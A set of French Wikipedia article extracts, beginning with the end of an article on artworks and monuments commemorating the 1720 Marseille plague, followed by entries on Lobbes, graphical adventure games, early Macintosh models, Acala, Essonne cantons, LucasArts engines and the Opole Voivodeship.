Le deuxième groupe représente l'inhumation des cadavres pestiférés de l'esplanade de la Tourette par le chevalier Roze ; il s'agit de la troisième toile de Michel Serre, "Scène de la peste de 1720 à la Tourette" () exposée au musée Atger de Montpellier, du tableau de Jean-François de Troy, "Le chevalier Roze à la Tourette" () peint en 1725 et actuellement au musée des Beaux-Arts de Marseille. Ce dernier tableau a servi de modèle à Thomassin pour réaliser une gravure en 1727 qui se trouve au musée de la Marine à Marseille. L’esquisse attribuée à Dandré-Bardon qui se trouve au musée des beaux-arts de Rouen concerne également le chevalier Roze. La toile "Scène de la peste de 1720 à la Tourette" de Michel Serre aurait appartenu au chevalier Roze en personne ; c'est celle où les pestiférés sont les plus présents avec les forçats dont l'aspect dramatique est renforcé par un bandeau imbibé de vinaigre qui est censé les protéger de la contagion. La présence du chevalier Roze, des échevins et des piquets de troupe à l'angle des rues est rendue nécessaire par la conduite redoutée des forçats. Cette toile donne par ailleurs en arrière-plan la meilleure représentation du portail baroque de l'ancienne cathédrale de la Major, détruit en 1851 pour faire place à la nouvelle cathédrale.
D'autres artistes ont, postérieurement à l'évènement, réalisé différents tableaux le représentant : on peut citer Paulin Guérin avec "Le Chevalier Roze faisant inhumer les pestiférés", toile peinte en 1826 et exposée au musée des Beaux-Arts à Marseille, Jean-Baptiste Duffaud avec "Le Chevalier Roze à la montée des Accoules", toile peinte en 1911 et exposée au musée du Vieux Marseille et D.A. Magaud avec "Le Courage civil : la peste de 1720 à Marseille" exposée au musée des Beaux-Arts de Marseille.
Ces toiles participent à la glorification de héros, civil pour le chevalier Roze, religieux pour de Belsunce, en mettant en relief le courage et le dévouement de ces personnages. Le chevalier Roze personnifie l’exemplarité de l’intervention de l’État, élément nouveau et décisif en 1720.
Sculptures et vitraux.
La statue la plus célèbre est celle de de Belsunce, réalisée par Joseph Marius Ramus et érigée en 1853 sur le cours qui porte aujourd'hui son nom ; elle se trouve actuellement sur le parvis de la cathédrale de la Major. Pendant la Seconde Guerre mondiale cette statue a été cachée par des résistants dans un entrepôt du boulevard de Louvain afin qu'elle ne soit pas prise par l'armée d'occupation pour la récupération du bronze après refonte.
D'autres monuments et sculptures commémorent cet évènement : les statues de de Belsunce, du chevalier Roze et de l'intendant de Provence Lebret se trouvent sur les façades de la préfecture ; le buste de J. Daviel à l'Hôtel-Dieu de Marseille et celui du chevalier Roze. Les portraits du docteur Peyssonnel et du chirurgien Daviel figurent sur les murs de la station de métro La Timone.
Deux vitraux de la basilique du Sacré-Cœur de Marseille représentent l'un la consécration de la ville de Marseille au Sacré-Cœur de Jésus par de Belsunce sur les conseils de la visitandine Anne-Madeleine Rémusat et l'autre le vœu prononcé par les échevins le à la suite de cette consécration.
Afin d'honorer l'héroïsme des Marseillais pendant la peste de 1720, un monument est érigé sous le Premier Empire place Estrangin-Pastré et inauguré le par le préfet Delacroix. Ce monument est constitué d'une sculpture de Chardigny représentant le génie de l'immortalité placé au sommet d'une colonne extraite des cryptes de l'abbaye Saint-Victor. Ce monument est transporté en 1839 place Félix-Baret (ancienne place Saint-Ferréol), puis en 1865 au jardin de la bibliothèque où il est toujours visible. L'original de la statue de Chardigny est au musée des Beaux-Arts de Marseille et ce n'est qu'une copie qui couronne aujourd'hui l'édifice. Sur le socle sont scellées quatre plaques de marbre avec les inscriptions suivantes :
Sur la face gauche du socle il est fait allusion à la capture par des pirates tunisiens d'un navire chargé de blé envoyé par le pape Clément XII pour venir en aide aux Marseillais ; ayant appris la destination du chargement, les corsaires tunisiens laissèrent le vaisseau poursuivre sa route.
La peste et la littérature.
Cet événement est repris par de nombreux écrivains :

</doc>
<doc id="191929" url="https://fr.wikipedia.org/wiki?curid=191929" title="Lobbes">
Lobbes

Lobbes est une commune francophone de Belgique située en Région wallonne dans la province de Hainaut. Elle est située près de la Sambre, un affluent de la Meuse.
Étymologie.
Pour certains spécialistes, le nom de Lobbes trouve son origine dans le terme "Laubacum" signifiant ruisseau, d’autres y voient une origine germanique se rapprochant du terme "lauh-baki" ou "lauha-baki" signifiant généralement ruisseau des bois.
Démographie.
Démographie : Commune fusionnée.
En tenant compte des anciennes communes entraînées dans la fusion de communes de 1977, on peut dresser l'évolution suivante :
"Les chiffres des années 1831 à 1970 tiennent compte des chiffres des anciennes communes fusionnées."
Histoire.
Moyen Âge.
Lobbes est une commune dont l’origine remonte au Moyen Âge puisque son histoire se confond avec celle du monastère bénédictin fondé en 654 par Landelin, un brigand converti au christianisme par saint Aubert, évêque de Cambrai. Landelin est un descendant du roi Mérovée et sa précieuse ascendance l'a certainement aidé à édifier le monastère qui deviendra le berceau de la cité que nous connaissons aujourd’hui. À peine deux siècles après sa fondation, le monastère devient non seulement une pépinière de savants et de saints mais aussi le centre d’un immense domaine dont fait mention le fameux polyptyque de Lobbes (un document rédigé par l’évêque de Cambrai à l’initiative de Lothaire II en 868-869). On sait d’ailleurs aujourd’hui que les cent septante-quatre villages qui composaient le domaine ont été donnés à l’abbaye par les souverains de l'époque et notamment par le roi des Francs Dagobert et par Pépin de Herstal dit le Vieux. Charlemagne fonde une école à Lobbes en 776, dont la riche bibliothèque valut à la ville d'être surnommée « Lobbes la Savante ». Saint Landelin n'est pas la seule grande figure de l’abbaye de Lobbes : saint Ursmer en assume la charge de 689 à 713 et la collégiale porte aujourd’hui encore son nom. En 888, l'abbaye passe sous l'autorité de l'évêché de Liège.
Au cours des siècles l'abbatiale est détruite à plusieurs reprises, mais l’église funéraire des moines située sur la colline voisine de l'abbaye, d'époque carolingienne, est préservée et devient ensuite collégiale. Lobbes est notamment assiégée par les Normands danois en 882 et les nomades magyars en 955.
Temps modernes.
Au la prospérité de l'abbaye est tellement mise à mal par les guerres que les chanoines sont obligés de quitter l’endroit pour se réfugier à Binche. Toutefois le monastère bénédictin continue sa mission jusqu’au , date à laquelle les troupes républicaines, menées par le général Louis Charbonnier, l’envahissent et y mettent le feu au cours d’un pillage qui dura trois jours. Les moines fuient en Allemagne alors que Napoléon accorde la propriété des biens de l'abbaye à Louis Charbonnier.
Antoine Chivot, seigneur de Lobbes, Haucourt, Precordier, Fossés, Alepolt, etc., bénéficie en avril 1668 de lettres de chevalerie héréditaire, données à Saint-Germain-en-Laye. Ancien échevin d'Arras, il est le fils de feu Jacques Chivot II, qui a été honoré du titre de chevalier et de la charge de président et chef du Conseil provincial d'Artois le . Ce Jacques Chivot II était lui-même fils de Jacques Chivot , mayeur de la ville d'Aire-sur-la-Lys, et petit-fils de Floris Chivot, hommes d'armes du roi catholique (le roi d'Espagne).
Époque contemporaine.
Première Guerre mondiale.
En août 1914, les envahisseurs allemands saccagent le quartier de la Place Communale et le couvent de la Visitation. Ensuite, sur les hauteurs de Heuleu, ils engagent un combat acharné contre les troupes françaises qui leur bloquent la route. Des centaines d'hommes perdent la vie. Leurs corps sont ensuite rassemblés dans deux cimetières, dont un seul, celui des Français, existe encore aujourd'hui.
Le , une crue de la Sambre emporte une péniche, détruisant le pont-levis, aujourd'hui disparu. Il a fallu faire appel aux soldats allemands pour retirer l'épave de la rivière.
Seconde Guerre mondiale.
Le , pendant la bataille de France, un chasseur de la Luftwaffe mitraille des réfugiés sur les routes de Lobbes, faisant 43 tués. Cette année-là et en 1944, la commune dut aussi subir des bombardements causant d’importants dégâts et faisant de nombreuses victimes.
Après guerre.
En 1977, Lobbes fusionne avec Bienne-lez-Happart, Mont-Saint-Geneviève et Sars-la-Buissière.
Politique et administration communale.
Sécurité.
Zone de Police 5912 Binche-Anderlues-Leernes-Quartier Lobbes/Anderlues, place communale.
Centre Arthur Regniers.
En 2022, le baron Jean-Marie Bogaert (ex-échevin MR de Lobbes) est arrêté, placé sous mandat d'arrêt et est incarcéré à la prison de Jamioulx. Il gère une fondation ("la Fondation Baron-Baronne Jean-Marie et Monique Bogaert") et deux asbl ("Vestric" et "Les amis des infirmes moteurs cérébraux"). Des réquisitions bancaires ont permis de découvrir des mouvements financiers qui posent question entre les comptes des asbl, de la fondation, et les comptes personnels de Jean-Marie Bogaert. À la suite du scandale, il est suspendu comme membre du Mouvement Réformateur par Denis Ducarme.
Patrimoine majeur, curiosités et culture.
Patrimoine architectural.
Voir aussi la liste du patrimoine immobilier classé de Lobbes.
Culture.
Folklore et traditions.
Le carnaval de Lobbes, créé en 1910, a un caractère unique: les Hottes, vêtues de costumes de grand-mère, transportent leurs maris dans leur hotte. Les Nonancourts, un groupe folklorique, ont été fondés au début du , formant une société musicale unique, avec un costume revisité et des interprétations originales.
Il existe aussi d'autres sociétés comme les Sorcières lobbaines, les Gilles, les Paysans Chaque dernier week-end de septembre a lieu à Lobbes la Ducasse 1900. Pendant les mois d'été, la tradition des joutes nautiques perdure au pont de Sambre grâce aux deux sociétés lobbaines. Remise en lumière par le père Luc en 1995, la procession menée par la confrérie des archers de Sainte-Appoline remonte à ses origines au .
Musée.
Lobbes possède un musée sur le miel, rue de la Fontaine Pépin.
Bibliothèque.
Réserve centrale du Réseau public de la Lecture (Fédération Wallonie-Bruxelles), rue des Quatre d'Gins .
Enseignement.
École communale du Centre, école communale des Bonniers et école libre de Lobbes.
Lieux publics.
Cimetières.
Lobbes possède deux cimetières : 
Salle polyvalente.
La commune possède une salle polyvalente « Les Blés Verts ».
Économie.
L'économie de Lobbes s'est principalement développée grâce à l'exploitation des carrières de grès, dont les blocs étaient transportés vers la gare par wagonnets. Jusqu'au début du , la Sambre attirait également des fonderies et un chantier naval. De l'autre côté, le long de l'actuelle rue de la Saline, un quartier abritant de petites industries comme une saline, une savonnerie, une brasserie et une briqueterie s'était établi au bord de l'eau. Aujourd’hui, c’est la qualité de vie de l’endroit qui y attire non seulement une population avide de calme et d’air sain mais aussi des touristes épris par la beauté de ses sites naturels et architecturaux de la Thudinie.
Tourisme.
Lobbes est composée de circuits de randonnées à travers la commune. Visite guidée de la collégiale Saint-Ursmer et des activités pendant l'année. Le syndicat d'initiative se trouve au place Communale.
Entreprises.
La plupart des entreprises sont situées dans le zoning Lobbes-Thuin créé dans les années 1970 :
Commerces.
Lobbes possède des petits commerces dans le centre et dans le quartier des Bonniers (cafés, friteries, épicerie
Brasserie.
Brasserie du Val de Sambre qui se situe dans le Zoning Lobbes-Thuin.
Produits du terroir.
Domaine de la Portelette, vignes. Ferme du Champ du Loup, ferme pédagogique avec un magasin de produits locaux.
Transport et communication.
Route.
Position centrale par rapport aux axes de mobilité (N59, N40 et N55), à 5 minutes d’Anderlues et de Thuin, 20 minutes de Charleroi et de Binche, et 40 minutes de Mons.
Train.
Situé au croisement des lignes Charleroi-Erquelinnes construite de 1845 à 1852 et de Mons-Chimay désaffectée.
La commune de Lobbes est traversée par la ligne 130A, de Charleroi à Erquelinnes, qui passe dans les localités de Mont-sur-Marchienne, Marchienne-au-Pont, Landelies, Hourpes, Thuin, Lobbes, Fontaine-Valmont, Labuissière, Solre-sur-Sambre et Erquelinnes-Village et Erquelinnes.
Bus.
Lobbes est desservi par les lignes des TEC : 21, 91, 109b et 119.
Sports et vie associative.
Sports.
Infrastructures.
Complexe Le Scavin, stade de football Roger Langelez et piscine Aquacenter, rue Paschal sur le site de la Visitation.
Vie associative.
Patronage Jean et Sainte-Agnès de Lobbes.

</doc>
<doc id="191935" url="https://fr.wikipedia.org/wiki?curid=191935" title="Jeu d'aventure graphique">
Jeu d'aventure graphique

Dans l'univers du jeu vidéo, le jeu d'aventure graphique est appelé ainsi par opposition aux jeux d'aventure textuelle (ou « jeu en mode texte »). Les jeux en pointer-cliquer (ou « jeux point-and-click ») font partie de cette famille de jeux vidéo.
Les premiers jeux d'aventures dans les années 1970 sont des fictions interactives en mode texte à l'interface très aride : il faut indiquer dans une zone d'entrée de texte les actions à faire. Au début des années 1980, les premiers jeux d'aventure graphique apparaissent : l'écran représente par des images ce qui était jusque-là raconté par un texte : les personnages et les décors dans lesquels ils évoluent. Néanmoins, les interactions avec l'univers de jeu se réalisent encore en mode texte.
Origines.
Le jeu vidéo d'aventure existait depuis un certain temps sous forme textuelle sur des plateformes (notamment l'Apple II), et des modèles différents et variés.
Mais le mode texte, bien que très répandu, était assez rebutant aux premiers abords pour les profanes et réservé en premier lieu aux passionnés. C'est une des raisons pour lesquelles le jeu d'aventure graphique est né. Ce genre de jeu a connu une époque glorieuse et est encore aujourd'hui très prisé, bien que délaissé par les éditeurs.
Le premier jeu d'aventure graphique "Mystery House", sorti en 1980, que l'on doit à Ken et Roberta Williams a eu un tel succès qu'il devient un genre à part entière. Devant un tel succès inattendu, ses concepteurs décident d'abandonner leurs vies d'alors pour créer une société spécialisée dans le développement de ce nouveau genre de jeu : On-Line Systems qui deviendra rapidement Sierra On-Line.
Jeu d'aventure en pointer-cliquer.
C'est au milieu des années 1980 avec la généralisation des environnements graphiques sur les ordinateurs personnels grand public (Macintosh, Amiga, Atari ST, compatibles PC) et donc de la souris, que l'interface en pointer-cliquer apparaît dans le jeu vidéo. En 1984, Jean-Louis Le Breton et Fabrice Gille créent "La Souris Golotte", un petit jeu d’aventure utilisant la souris fournie avec l'Apple IIc pour sa présentation. En 1985, le jeu "Déjà Vu" continuera dans cette idée"." (1986) sur Macintosh est aussi l'un des premiers jeux d'aventure graphique à proposer ce type de contrôle. Certaines sociétés, comme et , se sont ensuite fait une spécialité du genre, lui apportant diverses innovations, dont la principale est le passage de la vue à la première personne à celle à la troisième (héros évoluant à l'écran), amenée par en 1984 avec premier du nom.
Généralement, l'écran de jeu présente une fenêtre spécifique qui affiche les actions réalisables par le héros (représentés par des mots ou des icônes) : marcher, ouvrir, parler Le joueur pointe le curseur sur une action et clique afin de la valider. En cliquant ensuite sur des éléments clés de l'environnement de jeu, il va pouvoir faire interagir le personnage en conséquence : déplacement vers tel lieu, ouverture de tel meuble, discussion avec tel personnage L'interface en pointer-cliquer s'accompagne souvent de raccourcis clavier (ne serait-ce que pour sauvegarder, quitter, accéder aux options). Le pointer-cliquer peut se réaliser avec une manette, un joystick ou les touches du clavier, même si la souris s'avère souvent plus adaptée en termes de temps de réponse et de précision.
Le pointer-cliquer reste un standard dans le jeu d'aventure jusqu'au milieu des années 1990. Avec la généralisation de la 3D, ce type de jeu d'aventure se marginalise (et le genre tout entier dans le paysage vidéoludique). Dans les années 2000, le succès remporté par des séries comme "Syberia" (due à l'auteur de BD Benoît Sokal) ou "" marque un retour du jeu en pointer-cliquer. Les jeux d’aventure graphiques contemporains sont souvent indépendants : "Machinarium", "Kentucky Route Zero" et "Broken Age" en sont des exemples.
D'autres genres de jeux vidéo sont basés sur une interface pointer-cliquer : nombreux jeux de stratégie et jeux vidéo de rôle comme les jeux de type , des actions-RPG (par exemple "Diablo"), des jeux de réflexion (par exemple "Lemmings") ou même quelques jeux d'action (par exemple ""). Enfin, un contrôle à la souris n'est pas forcément synonyme d'interface en pointer-et-cliquer : des jeux d'adresse (par exemple ), des simulations automobiles et aériennes ou encore nombreux jeux de tir à la première personne se jouent à la souris, mais le joueur y contrôle directement et en temps réel un objet (l'avatar, le véhicule, la caméra).
Exemples.
Outre les jeux en pointer-cliquer cités dans les paragraphes ci-dessus, on trouve dans la même catégorie des jeux comme :

</doc>
<doc id="191936" url="https://fr.wikipedia.org/wiki?curid=191936" title="IMuse">
IMuse



</doc>
<doc id="191939" url="https://fr.wikipedia.org/wiki?curid=191939" title="COCOPAQ">
COCOPAQ



</doc>
<doc id="191946" url="https://fr.wikipedia.org/wiki?curid=191946" title="Anneau du Nibelung">
Anneau du Nibelung



</doc>
<doc id="191949" url="https://fr.wikipedia.org/wiki?curid=191949" title="Macintosh Performa 550">
Macintosh Performa 550

Le Macintosh Performa 550 était identique au Macintosh LC 520, à part un processeur cadencé à 33 MHz contre 25 MHz. Il embarquait un large disque dur de 160 Mo en standard ainsi qu'un lecteur CD-ROM. Lancé en octobre 1993 au prix de , il fut commercialisé jusqu'en avril 1996. À partir de janvier 1994, Apple vendit aussi un Performa 560 pour , dont la seule différence est qu'il était fourni avec une suite logicielle "business" et non familiale.
Il fut aussi commercialisé pour le marché de l'éducation sous le nom de Macintosh LC 550 entre février 1994 et mars 1995, pour un prix de .

</doc>
<doc id="191950" url="https://fr.wikipedia.org/wiki?curid=191950" title="Macintosh Performa 560">
Macintosh Performa 560



</doc>
<doc id="191951" url="https://fr.wikipedia.org/wiki?curid=191951" title="Macintosh LC 550">
Macintosh LC 550



</doc>
<doc id="191952" url="https://fr.wikipedia.org/wiki?curid=191952" title="Acala">
Acala

Acala l'immuable ou « Acalanātha » le maître immuable, est une déité bouddhique du mikkyō, il est l'un des cinq rois du savoir, associé au feu et à la colère.
C'est aussi une des dénominations de Shiva auquel il emprunte de nombreux traits. Appelé , il porte un lotus à huit pétales sur le sommet de son crâne, tient dans sa main droite un glaive avec lequel il coupe les obstacles, et, dans sa main gauche, une corde ("pāśa") qui symbolise la concentration et lui permet de lier les forces hostiles à l'éveil.
Il est souvent représenté sous forme courroucée avec le visage convulsé de colère. Ses canines sont saillantes, la droite pointant vers le haut, symbolisant le ciel et l'esprit, la gauche vers le bas, la terre et la matière. Une aura de feu agitée l'entoure complètement (les divinités pacifiques ont une aura semblable à une mer au repos). Il est assis sur un grand rocher symbolisant sa fermeté et sa détermination inébranlable. Il représente l’immuabilité.
Une forme particulière : Kurikara Fudo, le représente sous la forme d'un dragon enroulé autour d'une épée.
C'est la principale divinité irritée (dharmapāla) au Japon ou sous le nom de , il représente la forme irritée de Mahavairocana du mandala de la matrice, sa contrepartie du mandala du vajra étant Aizen Myōō ; l'un représente la transmutation de la colère, le second du désir.
Il est l'un des cinq Vidyarajas ou , « rois de lumière », défenseurs des cinq bouddhas de sagesse du vajrayāna. Le bouddha auquel il correspond est Akshobhya.
Il est aussi présent dans le mandala de Nichiren le Gohonzon sous la forme de son "bija" Ham (syllabe germe) écrit en siddham.
Le mantra de ce roi du savoir est « "Namaḥ samanta vajrāṇām ! Caṇḍa mahā-roṣaṇa sphoṭaya hūm traṭ hām mām !" ».

</doc>
<doc id="191954" url="https://fr.wikipedia.org/wiki?curid=191954" title="Théodore Leclercq">
Théodore Leclercq

Michel Théodore Leclercq, né le à Paris et mort le dans l'ancien arrondissement de Paris, est un dramaturge français.
Biographie.
Il est le fils de Charles Théodore François Leclercq, marchand mercier papetier parisien, et de Marie Victoire Lattré. Il a deux sœurs qui épousent des notaires parisiens : Marie Justine se marie avec Louis Denis Bocquet, Marie Suzanne Virginie convole avec Antoine Nicolas Ozanne.
Spécialiste du proverbe dramatique, Théodore Leclercq se fait une véritable réputation. Ses petites pièces sont destinées à des théâtres de société: au début de la Restauration, elles sont jouées dans le salon de François Roger. Elles sont reconnues pour leur finesse dans l'analyse des mœurs. Elles paraissent sous le titre de "Proverbes dramatiques" de 1823 à 1826 et "Nouveaux proverbes dramatiques" en 1830.
Homosexuel, Leclercq vit avec Joseph Fiévée: il apparaît ici et là dans la correspondance de ce dernier avec François Louis Auguste Ferrier. Dans le "Trésor de la langue française", au mot "Ménage", on peut lire : 
Il est inhumé aux côtés de Joseph Fiévée au cimetière du Père-Lachaise ().

</doc>
<doc id="191961" url="https://fr.wikipedia.org/wiki?curid=191961" title="Abdère">
Abdère

Abdère peut désigner :

</doc>
<doc id="191962" url="https://fr.wikipedia.org/wiki?curid=191962" title="PowerBook Duo 250">
PowerBook Duo 250

Le PowerBook Duo 250 est un ordinateur Apple sorti en 1994. Il ajoutait un écran à matrice active (toujours en niveaux de gris) au PowerBook Duo 230. Il utilisait aussi une batterie NiMH plus endurante (environ d'autonomie) et un disque dur plus gros (, ce qui était beaucoup pour un portable, surtout de cette taille). Ce fut le premier PowerBook Duo à bien se vendre.

</doc>
<doc id="191964" url="https://fr.wikipedia.org/wiki?curid=191964" title="IRS">
IRS

IRS est un sigle qui peut signifier :

</doc>
<doc id="191966" url="https://fr.wikipedia.org/wiki?curid=191966" title="Anime International Company">
Anime International Company

 (ou AIC) est un studio d'animation japonais fondé le .
AIC A.S.T.A.
 est un studio annexe d'AIC située à Nishitōkyō, dans la préfecture de Tokyo. Créé en 2003, AIC A.S.T.A compte 20 employés et a produit plusieurs séries pour le compte d'AIC: 
AIC Spirits.
 est un studio annexe d'AIC située à Nerima, dans la préfecture de Tokyo. Créé également en 2003, AIC Spirits compte 30 employés et a produit plusieurs séries pour le compte d'AIC.

</doc>
<doc id="191967" url="https://fr.wikipedia.org/wiki?curid=191967" title="Canton de Brunoy">
Canton de Brunoy

Le est une ancienne division administrative et une circonscription électorale française située dans le département de l’Essonne et la région Île-de-France.
À la suite du redécoupage cantonal de 2014, le canton est supprimé, et son territoire réparti entre les cantons d'Épinay-sous-Sénart et d'Yerres.
Géographie.
Situation.
Le canton était constitué de la seule ville de Brunoy dans l’arrondissement d'Évry. Son altitude variait entre trente-sept mètres et quatre-vingt-quatorze mètres à Brunoy, pour une altitude moyenne de cinquante-trois mètres.
Composition.
Le canton de Brunoy comptait une commune :
Historique.
Département de Seine-et-Oise.
Entre 1793 et 1801, le canton de Brunoy dans l’ancien département de Seine-et-Oise et l’ancien district de Corbeil comprenait les communes de Boussy sur Yerres, Brunoy, Epinay sous Senard, Mandres, Perigny, Quincy sous Senart, Varennes, Ville Crème et Yerres. Il fut supprimé en 1801 et pour partie intégré au canton de Boissy-Saint-Léger. 
Le canton de Brunoy du département de Seine-et-Oise (arrondissement de Corbeil-Essonnes) a été recréé par scission du canton de Villeneuve-Saint-Georges par le décret du 28 janvier 1964. Il était constitué des communes de Boussy-Saint-Antoine, Brunoy, Épinay-sous-Sénart, Quincy-sous-Sénart, Varennes-Jarcy et Yerres.
Département de l'Essonne.
Le canton de Brunoy, division de l’actuel département de l’Essonne, fut créé par le décret 67-589 du , il regroupait à l’époque les communes de Brunoy, Boussy-Saint-Antoine, Épinay-sous-Sénart, Quincy-sous-Sénart, Varennes-Jarcy et Yerres. 
Le décret du le scinda afin de créer le canton d'Yerres avec la commune d’Yerres. 
Le canton fut à nouveau scindé par le décret du afin de créer le canton d'Épinay-sous-Sénart en ne laissant que Brunoy comme ville-canton.
Un nouveau découpage territorial de l'Essonne (département) entré en vigueur à l'occasion des premières élections départementales suivant le décret du . Les conseillers départementaux sont, à compter de ces élections, élus au scrutin majoritaire binominal mixte. Les électeurs de chaque canton élisent au Conseil départemental, nouvelle appellation du Conseil général, deux membres de sexe différent, qui se présentent en binôme de candidats. Les conseillers départementaux sont élus pour au scrutin binominal majoritaire à deux tours, l'accès au second tour nécessitant 12,5 % des inscrits au . En outre, la totalité des conseillers départementaux est renouvelée. Ce nouveau mode de scrutin nécessite un redécoupage des cantons dont le nombre est divisé par deux avec arrondi à l'unité impaire supérieure si ce nombre n'est pas entier impair, assorti de conditions de seuils minimaux. Dans l'Essonne le nombre de cantons passe ainsi de 42 à 21
Dans ce cadre, le canton est supprimé, et le territoire de la commune de Brunoy est réparti entre cantons d'Épinay-sous-Sénart et d'Yerres.
Représentation.
Résultats électoraux.
Élections cantonales, résultats des deuxièmes tours :

</doc>
<doc id="191969" url="https://fr.wikipedia.org/wiki?curid=191969" title="GrimE">
GrimE

' pour ""' est un moteur de jeu développé par LucasArts. Il est le descendant de SCUMM et est destiné aux jeux d'aventure graphique en 3D. Il a servi notamment pour "Grim Fandango" et "Escape from Monkey Island". Il utilise le langage de script "open source" Lua.
Il est prévu pour jouer sans se servir de souris informatique.
ResidualVM, un projet voisin de la machine virtuelle ScummVM, vise à fournir une implémentation libre du moteur GrimE par le biais de la rétro-ingénierie.

</doc>
<doc id="191971" url="https://fr.wikipedia.org/wiki?curid=191971" title="AIC">
AIC

AIC est un code qui peut désigner :
AIC est un sigle qui peut désigner :

</doc>
<doc id="191972" url="https://fr.wikipedia.org/wiki?curid=191972" title="Interactive Music Streaming Engine">
Interactive Music Streaming Engine

L’ () est un système de synchronisation audio développé par Michael Land et Peter McConnell en 1991 dans le cadre du développement de "". Il permet de synchroniser les pistes audio avec les événements se déroulant dans le jeu. La musique s’adapte ainsi en fonction des environnements ou des situations dans lesquels se trouve le joueur, le passage d’une piste audio à une autre se faisant de manière logique. Le système est intègré au moteur de jeu Script Creation Utility for Maniac Mansion et est donc utilisé dans tous les jeux d'aventure basé sur ce dernier à partir de 1991. Il est également utilisé dans d’autres titres développés par LucasArts tels que "".
iMUSE est considéré comme une des premières contributions significatives à la musique interactive dans les jeux vidéo.

</doc>
<doc id="191974" url="https://fr.wikipedia.org/wiki?curid=191974" title="Interactive MUsic Streaming Engine">
Interactive MUsic Streaming Engine



</doc>
<doc id="191975" url="https://fr.wikipedia.org/wiki?curid=191975" title="Voïvodie d'Opole">
Voïvodie d'Opole

La voïvodie d’Opole (en ; en ) est l'une des 16 régions administratives (voïvodies) de la Pologne. Son chef-lieu est la ville d'Opole.
La voïvodie fut créée le à partir de l’ancienne voïvodie d’Opole et de fragments des anciennes voïvodies de Częstochowa, à la suite d'une loi de 1998 réorganisant le découpage administratif du pays. 
Elle se divise en 12 districts ("powiats"), dont une ville possédant des droits de district, et 71 communes. Le nom de la voïvodie fait référence à la ville la plus importante.
La région d'Opole compte la plus forte minorité de langue allemande de Pologne avec plus de .
Situation géographique.
La voïvodie d’Opole est située au sud-ouest de la Pologne. 
La plus grande partie de la voïvodie se trouve sur la plaine de Silésie ("Nizina Śląska") mais la partie orientale empiète sur la zone montagneuse de Silésie ("Wyżyna Śląska") qui fait partie des Sudètes. L’Oder traverse la région. 
Bien que ce soit la plus petite et la moins peuplée des voïvodies, sa situation géographique et son potentiel économique en font un partenaire de choix pour les autres régions (surtout les voïvodies de Basse-Silésie et de Silésie) et pour les pays voisins. La région a toujours été le carrefour de routes commerciales dont la plus célèbre, la route de l'ambre, passait par l'Italie, la Moravie et la Baltique. Depuis 1997, elle est associée à l’Eurorégion "Pradziad" qui favorise les échanges commerciaux, culturels et touristiques entre les zones frontalières de la Pologne et de la Tchéquie. La voïvodie se caractérise également par une forte présence de la minorité allemande. La région est le point de passage du trafic terrestre entre l’Allemagne et l’Ukraine.
Politique.
La diétine (sejmik) d'Opole est composée de la façon suivante.
Composition de la diétine (sejmik) d'Opole :
Élections de 2018 :
Élections de 2014 : 
Élections de 2010 : 
Élections de 2006 : 
Élections de 2002 :
Économie.
Principaux secteurs d'activité :

</doc>
<doc id="191978" url="https://fr.wikipedia.org/wiki?curid=191978" title="Canton d'Épinay-sous-Sénart">
Canton d'Épinay-sous-Sénart

Le canton d'Épinay-sous-Sénart est une circonscription électorale française française située dans le département de l'Essonne et la région Île-de-France.
À la suite du redécoupage cantonal de 2014, les limites territoriales du canton sont remaniées. Le nombre de communes du canton passe de 4 à 8 + une fraction de Brunoy.
Géographie.
Le canton d'Épinay-sous-Sénart est organisé autour de la commune d'Épinay-sous-Sénart dans l'arrondissement d'Évry. Son altitude varie entre trente-sept mètres à Épinay-sous-Sénart et quatre-vingt-quatorze mètres à Varennes-Jarcy, pour une altitude moyenne de soixante-neuf mètres.
Historique.
Le canton d'Épinay-sous-Sénart a été créé par décret ministériel du par démembrement du canton de Brunoy avec les communes de Boussy-Saint-Antoine, Épinay-sous-Sénart, Quincy-sous-Sénart et Varennes-Jarcy.
Par décret du 24 février 2014, le nombre de cantons du département est divisé par deux, avec mise en application aux élections départementales de mars 2015. Le canton d'Épinay-sous-Sénart est conservé et s'agrandit. Il passe de 4 à 8 communes + une fraction de Brunoy .
Représentation.
Représentation avant 2015.
Résultats électoraux.
Élections cantonales, résultats des deuxièmes tours :
Résultats détaillés.
Élections de mars 2015.
À l'issue du des élections départementales de 2015, deux binômes sont en ballottage : Damien Allouch et Annick Dischbein (Union de la Gauche, 30,23 %) et Olivia Le Roux et Laurent Stillen (FN, 24,66 %). Le taux de participation est de 45,58 % ( sur ) contre 47,42 % au niveau départemental et 50,17 % au niveau national.
Au second tour, Damien Allouch et Annick Dischbein (Union de la Gauche) sont élus avec 61,77 % des suffrages exprimés et un taux de participation de 46,24 % ( pour et ).
Élections de juin 2021.
Le premier tour des élections départementales de 2021 est marqué par un très faible taux de participation (33,26 % au niveau national). Dans le canton d'Épinay-sous-Sénart, ce taux de participation est de 26,73 % ( sur ) contre 30,18 % au niveau départemental. À l'issue de ce premier tour, deux binômes sont en ballottage : Damien Allouch et Annick Dischbein (PS, 43,81 %) et Caroline Brillaux et Riad Hatik (Union au centre et à droite, 33,03 %).
Le second tour des élections est marqué une nouvelle fois par une abstention massive équivalente au premier tour. Les taux de participation sont de 34,36 % au niveau national, 32,47 % dans le département et 28,87 % dans le canton d'Épinay-sous-Sénart. 
Damien Allouch et Annick Dischbein (PS) sont élus avec 50,04 % des suffrages exprimés ( pour et ), devançant de seulement 7 voix le binôme constitué de Caroline Brillaux (SE) et Riad Hatik (SE). Le Conseil d'État a confirmé le la régularité de cette élection marqué par un très faible écart de voix, contredisant ainsi le jugement du tribunal administratif de Versailles du .
Composition.
Composition avant 2015.
Le canton d'Épinay-sous-Sénart comptait quatre communes.
Composition depuis 2015.
Le canton d'Épinay-sous-Sénart comprend désormais huit communes entières et une fraction de Brunoy.
La fraction de la commune de Brunoy comprise dans le canton d'Épinay-sous-Sénart est la partie située à l'ouest d'une ligne définie par l'axe des voies et limites suivantes : depuis la limite territoriale de la commune d'Yerres, rue de Montgeron, avenue du Général-Leclerc (route départementale 54), rue Dupont-Chaumont, rue de Quincy, jusqu'à la limite territoriale de la commune d'Épinay-sous-Sénart.

</doc>
<doc id="191979" url="https://fr.wikipedia.org/wiki?curid=191979" title="Qi gong">
Qi gong

Le qi gong est une gymnastique traditionnelle chinoise et une pratique de la respiration fondée sur la connaissance et la maîtrise du souffle et qui associe mouvements lents, exercices respiratoires et concentration. Autres appellations : qigong, chi gong ou chi kung (). Le terme signifie littéralement « réalisation ou accomplissement ("gong") relatif au "qi "», ou « maîtrise du souffle ».
Traduction et terminologie.
